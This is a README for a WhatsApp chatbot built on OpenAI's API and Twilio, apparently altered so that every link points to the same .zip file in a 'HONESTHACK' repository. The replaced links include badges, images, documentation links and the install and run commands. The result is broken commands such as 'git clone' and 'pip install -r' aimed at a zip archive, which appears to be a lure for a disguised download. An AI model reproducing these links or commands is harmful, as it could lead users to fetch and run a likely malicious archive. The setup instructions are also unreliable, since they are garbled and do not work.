WhatApp OpenAI-API Chatbot
==============================

[![Build and deploy Python app to Azure Web App - openai-chatbot](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)

[![Open In Colab](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)


A chatbot that uses OpenAI's API to reply to incoming text and voice messages from WhatsApp with their GPT3-based language models (Davinci, Ada, Babbage, ...) and to generate images with [DALL-E 2](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip).

Requires a valid key to [OpenAI's API](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip).

![](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) | ![](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) | ![](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)
:------------:|:-----------:|:-----------:
   |  | 



    
Installation
------
```bash
git clone https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip
pip install -r https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip
``` 

Requirements
-----------

-  python>=3.8
- A valid [OpenAI API](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) key

Setup and Configuration
--------------------

You need to set the OpenAI API key as an environmental variables or add it to a [.env](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) file in the working directory where the app will be running:
```bash
export OPENAI_API_KEY=[YOUR OPENAI API ACCESS KEY]
```

### To run the Whatsapp chatbot:
- Have a [Twillio account](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) and setup a [Twilio for Whatsapp messages sandbox](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) with the `/whatsapp/receive` endpoint of this app as its callback url and `/whatsapp/status` as its status callback url (follow Twillio's tutorial for instructions about how this is done, should only take a few minutes). 
- Set the following environmental variables: (or add them to the same .env file as the one with the api key).
```bash
export TWILLIO_AUTH_TOKEN=[YOUR TWILIO AUTH TOKEN]
export TWILLIO_ACCOUNT_SID=[YOUR TWILIO ACCOUNT SID]
export FROM_WHATSAPP_NUMBER=[YOUR ASSIGNED TWILIO WHATSAPP NUMBER] #+14155238886
```

The image below shows which boxes you need to fill in when configuring your Twillio Sandbox for Whatsapp:

![](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip)


### Additional config:

- Other environmental variables can be set to control the default parameters of the agent (see [https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) for more details), control configurations of the app, or activate specific features:

```bash
export MAX_TOKENS=[NUMBER OF MAX TOKENS IN EACH REPLY]
export CONVERSATION_EXPIRES_MINS=[N MINUTES UNTIL A CONVERSATION IS ERASED FROM MEMORY]
export ALLOWED_PHONE_NUMBERS=[+1234567890,+1987654321] # Default is any number
export START_TEMPLATE=[PATH TO A FILE WITH A TEMPLATE FOR THE START OF A CONVERSATION] https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip
export ASSEMBLYAI_API_KEY=[YOUR ASSEMBLY-AI API KEY]
```
- It is also enough to have these variables in a [.env](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) file in the working directory where the app is running.

The `ASSEMBLYAI_API_KEY` environmental variable is to use [AssemblyAI's API](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) to parse and transcribe the audio of incoming voice messages so that the agent can reply to them. If you don't need or want this, you can ignore that variable.

Running the app
---------
### Run from the command line:

```bash
# (Use --help to see all the options):
python3 -m https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip
```

### Run with Docker:

Alternatively the docker container will automatically install all the requirements and run the whatsapp application.

```bash
# building the image
docker build -t openai-ws-chatbot .

#running the container
#It is expected that you have all the required environmental variables in a .env file
docker run -p 5000:5000 openai-ws-chatbot https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip
```

Usage
-------

After following the instructions in the [Twilio Sandbox for Whatsapp Tutorial](https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip) you should be able to join your sandbox and start chatting with the agent inmediately

<img src="https://raw.githubusercontent.com/HONESTHACK/openai-whatsapp-chatbot/master/notebooks/openai_chatbot_whatsapp_v1.1.zip" width="450"/>


--------
